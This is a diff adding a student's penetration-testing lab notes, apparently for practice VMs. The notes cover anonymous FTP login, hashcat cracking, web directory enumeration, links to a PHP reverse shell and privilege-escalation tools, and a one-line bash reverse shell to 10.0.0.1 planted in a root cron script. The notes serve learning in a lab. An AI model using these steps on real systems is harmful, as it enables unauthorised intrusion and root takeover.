@@ -1742,5 +1742,76 @@ for shoes in [high, medium, low]:
 > Now find out which IP:
 > `ip a`
 
+> [!check] 
+>` ftp <IP of Machine> `
+>Try to login with `anonymous` as user and password
+>Dictionarly listing with `ls`
+>Fetch a file: `get note.txt`
 
+> [!hint] 
+> Hash Identifier:
+> `hash-identifier`
+
+> [!hint] 
+> Cracking Hashes
+> (Do it on base OS, because it should use GPU to crack it faster)
+> `hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt`
+
+> [!todo] 
+> Enumeration Website with **dirb**
+> It's using its own wordlist.
+> `dirb http://192.168.138.129` 
+
+> [!todo] 
+> Enumeration Website with ffuf:
+> This example only enumerate on first level.
+> `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.138.129/FUZZ` 
+
+> [!info] 
+> PHP Reverse Shell:
+> https://github.com/pentestmonkey/php-reverse-shell
+> Before Upload Change IP & Port
+> Open Reverse Shell listener: `nc -nvlp 1234`
+
+> [!info] 
+> Privilage Escalation:
+>  https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+>  
+
+![[Pasted image 20230102125850.png]]
+![[Pasted image 20230102130036.png]]
+![[Pasted image 20230102130354.png]]
+> [!info] 
+> Check cron:
+> `crontab -u root -l` 
+> [!info] 
+> Check systemctl:
+> `systemctl list-timers` 
+
+> [!info] 
+> Linux Process Info:
+>  https://github.com/DominicBreuker/pspy
+
+> [!tip] 
+> One line reverse shell:
+>  `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
+>  Add reverse shell to backup.sh, because backup.sh is executed by root as crohn job every minute. Like this we can get root access on VM.
+
+
+
+### Walkthrough - Dev
+
+#### My own Report
+
+![[Report_Dev.pdf]]
+
+
+#### Guide from Video
+
+> [!info] 
+> Local File Inclution: https://www.exploit-db.com/exploits/48411
+> 
+
+![[Pasted image 20230102182616.png]]
+![[Pasted image 20230102183026.png]]
 
